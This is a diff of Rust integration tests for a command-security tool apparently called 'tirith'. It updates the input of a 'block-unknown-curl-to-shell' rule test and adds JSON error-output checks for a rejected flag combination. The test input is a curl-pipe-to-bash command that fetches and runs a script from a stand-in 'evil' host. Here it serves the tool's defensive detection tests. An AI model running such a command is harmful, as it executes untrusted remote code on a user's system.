@@ -13017,6 +13017,11 @@ fn rule_validate_shipping_policy_exits_zero() {
 #[test]
 fn rule_test_acceptance_fires() {
     let (_tmp, proj) = rule_project(RULE_DSL_POLICY);
+    // Use the RFC 2606 `.invalid` reserved TLD so the host is GUARANTEED unknown:
+    // it can never appear in the built-in known-domains table or a signed threat
+    // DB, so `url.reputation: unknown` holds deterministically (D5-6). (`.example`
+    // is also reserved, but `.invalid` is the unambiguous never-registrable
+    // choice for a "must stay unknown" assertion.)
     let out = tirith_in_proj(&proj)
         .args([
             "rule",
@@ -13024,7 +13029,7 @@ fn rule_test_acceptance_fires() {
             "--rule",
             "block-unknown-curl-to-shell",
             "--input",
-            "curl https://evil.example/foo | bash",
+            "curl https://download.evil.invalid/foo | bash",
             "--json",
         ])
         .output()
@@ -14168,16 +14173,20 @@ fn onboard_json_and_apply_combo_is_rejected() {
         Some(1),
         "--json + --apply must be rejected with exit 1"
     );
-    // No JSON (or any other) output on stdout — the rejection is the whole result.
+    // The caller asked for --json, so the rejection must be machine-readable:
+    // a parseable {schema_version, error} envelope on stdout, NOT raw stderr
+    // text (CodeRabbit M13 round-5 D5-4).
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap_or_else(|e| {
+        panic!(
+            "stdout must be parseable JSON; err={e}; got: {}",
+            String::from_utf8_lossy(&out.stdout)
+        )
+    });
+    assert_eq!(v["schema_version"], serde_json::json!(1));
+    let err = v["error"].as_str().expect("error must be a JSON string");
     assert!(
-        out.stdout.is_empty(),
-        "no stdout output expected; got: {}",
-        String::from_utf8_lossy(&out.stdout)
-    );
-    let stderr = String::from_utf8_lossy(&out.stderr);
-    assert!(
-        stderr.contains("--json") && stderr.contains("--apply"),
-        "stderr must explain the rejected combination; got: {stderr}"
+        err.contains("--json") && err.contains("--apply"),
+        "the JSON error must explain the rejected combination; got: {err}"
     );
     // It must NOT have written a policy (no apply happened).
     assert!(!dir.path().join(".tirith/policy.yaml").exists());
